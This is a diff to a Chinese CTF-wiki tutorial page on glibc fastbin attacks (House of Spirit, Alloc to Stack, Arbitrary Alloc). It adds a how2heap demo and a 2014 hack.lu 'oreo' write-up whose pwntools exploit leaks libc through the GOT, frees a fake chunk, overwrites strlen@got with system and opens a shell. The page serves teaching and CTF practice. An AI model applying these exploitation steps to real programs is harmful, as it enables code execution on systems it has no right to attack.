@@ -14,7 +14,10 @@ fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机�
 
 - Fastbin Double Free
 - House of Spirit
+- Alloc to Stack
 - Arbitrary Alloc
+
+其中，前两种主要漏洞侧重于利用 `free` 函数释放**真的 chunk 或伪造的 chunk**，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 `fd` 指针，直接利用 `malloc` 申请指定位置 chunk 进行攻击。
 
 ## 原理
 
@@ -85,7 +88,7 @@ Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可�
 Fastbin Double Free 能够成功利用主要有两部分的原因
 
 1. fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空
-2. fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，对于链表后面的块，并没有进行验证。
+2. fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。
 
 ```
 /* Another simple check: make sure the top of the bin is not the
@@ -278,20 +281,100 @@ if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
 
 ### 小总结
 通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。
-如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果(首先要通过验证)，这就相当于任意地址写任意值的效果。
+如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果( 首先要通过验证 )，这就相当于任意地址写任意值的效果。
 
 ## House Of Spirit
 
 ### 介绍
 
-House of Spirit 是 House of XX 的一种，House of XX 是 2004 年左右的一篇关于 Linux 堆利用的技术文章中提出一系列利用方法。
-HOS 可以使得 fastbin 堆块分配到栈中，从而实现控制栈中的一些关键数据，比如返回地址等。
+House of Spirit 是 `the Malloc Maleficarum` 中的一种技术。
 
-如果你已经理解了前文所讲的 Fastbin Double Free，那么理解 HOS 就已经不成问题了，它们的本质都在于 fastbin 链表的构成特性：当前 chunk 的 fd 指针指向下一个 chunk。
-HOS 的核心同样在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，实现控制栈中数据。
+该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配**指定地址**的 chunk 的目的。
+
+要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即
+
+- fake chunk 的 ISMMAP 位不能为1，因为 free 时，如果是 mmap 的 chunk，会单独处理。
+- fake chunk 地址需要对齐， MALLOC_ALIGN_MASK
+- fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。
+- fake chunk 的 next chunk 的大小不能小于 `2 * SIZE_SZ`，同时也不能大于`av->system_mem` 。
+- fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。
+
+至于为什么要绕过这些检测，可以参考 free 部分的源码。
 
 ### 演示
-这次我们把 fake_chunk 置于栈中称为 stack_chunk，同时劫持了fastbin 链表中 chunk 的 fd 值，通过把这个 fd 值指向 stack_chunk 就可以实现在栈中分配 fastbin chunk。
+
+这里就直接以 how2heap 上的例子进行说明，如下
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+	fprintf(stderr, "This file demonstrates the house of spirit attack.\n");
+
+	fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
+	malloc(1);
+
+	fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
+	unsigned long long *a;
+	// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
+	unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
+
+	fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[7]);
+
+	fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
+	fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
+	fake_chunks[1] = 0x40; // this is the size
+
+	fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
+        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
+	fake_chunks[9] = 0x1234; // nextsize
+
+	fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
+	fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
+	a = &fake_chunks[2];
+
+	fprintf(stderr, "Freeing the overwritten pointer.\n");
+	free(a);
+
+	fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
+	fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
+}
+```
+
+运行后的效果如下
+
+```shell
+➜  how2heap git:(master) ./house_of_spirit 
+This file demonstrates the house of spirit attack.
+Calling malloc() once so that it sets up its memory.
+We will now overwrite a pointer to point to a fake 'fastbin' region.
+This region (memory of length: 80) contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88.
+This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
+... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. 
+The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.
+Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58.
+... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
+Freeing the overwritten pointer.
+Now the next malloc will return the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60!
+malloc(0x30): 0x7ffd9bceaa60
+```
+
+### 小总结
+
+可以看出，想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，**关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测**。
+
+## Alloc to Stack
+
+### 介绍
+
+如果你已经理解了前文所讲的 Fastbin Double Free 与 house of spirit 技术，那么理解该技术就已经不成问题了，它们的本质都在于 fastbin 链表的特性：当前 chunk 的 fd 指针指向下一个 chunk。
+
+该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。
+
+### 演示
+这次我们把 fake_chunk 置于栈中称为 stack_chunk，同时劫持了 fastbin 链表中 chunk 的 fd 值，通过把这个 fd 值指向 stack_chunk 就可以实现在栈中分配 fastbin chunk。
 ```
 typedef struct _chunk
 {
@@ -319,7 +402,7 @@ int main(void)
     return 0;
 }
 ```
-通过gdb调试可以看到我们首先把 chunk1 的 fd 指针指向了 stack_chunk
+通过 gdb 调试可以看到我们首先把 chunk1 的 fd 指针指向了 stack_chunk
 ```
 0x602000:	0x0000000000000000	0x0000000000000021 <=== chunk1
 0x602010:	0x00007fffffffde60	0x0000000000000000
@@ -361,16 +444,14 @@ int main(void)
 
 
 ### 小总结
-通过 HOS 我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的size值。
+通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的size值。
 
 ## Arbitrary Alloc
 
 ### 介绍
 
-Arbitrary Alloc 其实与 House of Spirit 是完全相同的，唯一的区别是分配的目标不再是栈中。
-事实上只要满足目标地址存在合法的size域，我们可以把chunk分配到任意的可写内存中，比如bss、heap、data、stack等等。
-
-大家可能会认为 HOS 与 arbitrary alloc 没有什么区别，因此没有必要分为两类。相信看完下面的一个例子，就会有不一样的想法了。
+Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。
+事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如bss、heap、data、stack等等。
 
 ### 演示
 在这个例子，我们使用字节错位来实现直接分配 fastbin 到**\_malloc_hook的位置，相当于覆盖_malloc_hook来控制程序流程。**
@@ -455,7 +536,155 @@ Fastbins[idx=6, size=0x70]
 
 
 ### 小总结
-虽然 Arbitrary Alloc 与 HOS 的原理是相同的，但是 Arbitrary Alloc 在 CTF 中要比 HOS 使用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。
+Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。
+
+## 2014 hack.lu oreo
+
+### 基本分析
+
+```shell
+➜  2014_Hack.lu_oreo git:(master) file oreo
+oreo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=f591eececd05c63140b9d658578aea6c24450f8b, stripped
+➜  2014_Hack.lu_oreo git:(master) checksec oreo         
+[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_spirit/2014_Hack.lu_oreo/oreo'
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+可以看出，程序确实是比较老的，32位程序，动态链接，就连 RELRO 技术也没有上。
+
+### 基本功能
+
+**需要注意的是，该程序并没有进行 setvbuf 操作，因此在初次执行 io 函数时，会在堆上分配空间。**
+
+正如程序中直接输出的信息，程序主要是一个原始的在线枪支系统。其中，根据添加枪支的过程，我们可以得到枪支的基本结构如下
+
+```c
+00000000 rifle           struc ; (sizeof=0x38, mappedto_5)
+00000000 descript        db 25 dup(?)
+00000019 name            db 27 dup(?)
+00000034 next            dd ?                    ; offset
+00000038 rifle           ends
+```
+
+程序的基本功能如下
+
+- 添加枪支，其主要会读取枪支的名字与描述。但问题在于读取的名字的长度过长，可以覆盖 next 指针以及后面堆块的数据。可以覆盖后面堆块的数据大小为 56-(56-27)=27 大小。需要注意的是，这些枪支的大小都是在fastbin 范围内的。
+- 展示添加枪支，即从头到尾输出枪支的描述与名字。
+- 订已经选择的枪支，即将所有已经添加的枪支释放掉，但是并没有置为NULL。
+- 留下订货消息
+- 展示目前状态，即添加了多少只枪，订了多少单，留下了什么信息。
+
+不难分析得到，程序的漏洞主要存在于添加枪支时的堆溢出漏洞。
+
+### 利用
+
+基本利用思路如下
+
+1. 由于程序存在堆溢出漏洞，而且还可以控制 next 指针，我们可以直接控制 next 指针指向程序中 got 表的位置。当进行展示的时候，即可以输出对应的内容，这里同时需要确保假设对应地址为一个枪支结构体时，其 next 指针为 NULL。这里我采用 puts@got。通过这样的操作，我们就可以获得出 libc 基地址，以及 system 函数地址。
+2. 由于枪支结构体大小是 0x38 大小，所以其对应的 chunk 为 0x40。这里采用 `house of sprit` 的技术来返回 0x0804A2A8 处的chunk，即留下的消息的指针。因此，我们需要设置 0x0804A2A4 处的内容为 0x40，即需要添加 0x40 支枪支，从而绕过大小检测。同时为了确保可以绕过 next chunk 的检测，这里我们编辑留下的消息。
+3. 在成功分配这样的 chunk 后，我们其实就有了一个任意地址修改的漏洞，这里我们可以选择修改一个合适的 got 项为 system 地址，从而获得 shell。
+
+具体代码如下
+
+```python
+from pwn import *
+context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
+if args['DEBUG']:
+    context.log_level = 'debug'
+context.binary = "./oreo"
+oreo = ELF("./oreo")
+if args['REMOTE']:
+    p = remote(ip, port)
+else:
+    p = process("./oreo")
+log.info('PID: ' + str(proc.pidof(p)[0]))
+libc = ELF('./libc.so.6')
+
+
+def add(descrip, name):
+    p.sendline('1')
+    #p.recvuntil('Rifle name: ')
+    p.sendline(name)
+    #p.recvuntil('Rifle description: ')
+    #sleep(0.5)
+    p.sendline(descrip)
+
+
+def show_rifle():
+    p.sendline('2')
+    p.recvuntil('===================================\n')
+
+
+def order():
+    p.sendline('3')
+
+
+def message(notice):
+    p.sendline('4')
+    #p.recvuntil("Enter any notice you'd like to submit with your order: ")
+    p.sendline(notice)
+
+
+def exp():
+    print 'step 1. leak libc base'
+    name = 27 * 'a' + p32(oreo.got['puts'])
+    add(25 * 'a', name)
+    show_rifle()
+    p.recvuntil('===================================\n')
+    p.recvuntil('Description: ')
+    puts_addr = u32(p.recvuntil('\n', drop=True)[:4])
+    log.success('puts addr: ' + hex(puts_addr))
+    libc_base = puts_addr - libc.symbols['puts']
+    system_addr = libc_base + libc.symbols['system']
+    binsh_addr = libc_base + next(libc.search('/bin/sh'))
+
+    print 'step 2. free fake chunk at 0x0804A2A8'
+
+    # now, oifle_cnt=1, we need set it = 0x40
+    oifle = 1
+    while oifle < 0x3f:
+        # set next link=NULL
+        add(25 * 'a', 'a' * 27 + p32(0))
+        oifle += 1
+    payload = 'a' * 27 + p32(0x0804a2a8)
+    # set next link=0x0804A2A8, try to free a fake chunk
+    add(25 * 'a', payload)
+    # before free, we need to bypass some check
+    # fake chunk's size is 0x40
+    # 0x20 *'a' for padding the last fake chunk
+    # 0x40 for fake chunk's next chunk's prev_size
+    # 0x100 for fake chunk's next chunk's size
+    # set fake iofle' next to be NULL
+    payload = 0x20 * '\x00' + p32(0x40) + p32(0x100)
+    payload = payload.ljust(52, 'b')
+    payload += p32(0)
+    payload = payload.ljust(128, 'c')
+    message(payload)
+    # fastbin 0x40: 0x0804A2A0->some where heap->NULL
+    order()
+    p.recvuntil('Okay order submitted!\n')
+
+    print 'step 3. get shell'
+    # modify free@got to system addr
+    payload = p32(oreo.got['strlen']).ljust(20, 'a')
+    add(payload, 'b' * 20)
+    log.success('system addr: ' + hex(system_addr))
+    #gdb.attach(p)
+    message(p32(system_addr) + ';/bin/sh\x00')
+
+    p.interactive()
+
+
+if __name__ == "__main__":
+    exp()
+
+```
+
+当然，该题目也可以使用 `fast bin attack` 中的其它技术来实现，可参考参考文献中的链接。
 
 ## 2015 9447 CTF : Search Engine
 
@@ -1048,7 +1277,12 @@ p.interactive()
 ```
 同时，这里的 onegadget 地址也可能需要尝试多次。
 
+## 题目
+
+- L-CTF2016–pwn200
+
 ## 参考文献
 
 - https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/
 - http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html
+- https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717
